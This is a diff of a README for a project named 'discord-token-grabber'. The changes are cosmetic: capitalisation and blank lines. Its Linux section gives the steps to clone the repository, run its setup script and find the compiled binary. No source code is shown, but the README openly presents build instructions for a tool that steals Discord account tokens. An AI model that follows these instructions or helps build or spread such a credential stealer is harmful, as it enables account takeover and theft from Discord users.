@@ -13,13 +13,15 @@
 > [Rust](https://www.rust-lang.org/tools/install) Complier is required to continue...
 
 <details>
-<summary>How to on windows?</summary>
+<summary>How to on Windows?</summary>
 I don't use windows. I can't help sorry.
 </details>
 
 <details>
 <summary>How to on Linux?</summary>
+
 Downloading & Compiling the code.
+
 ```bash
 git clone https://github.com/TheMaestro1s/discord-token-grabber.git
 cd discord-token-grabber
@@ -27,6 +29,7 @@ sh ./setup.sh
 ```
 
 After compiling you will found a file named `discord-token-grabber` in the following path `./build/release`
+
 </details>
 
 
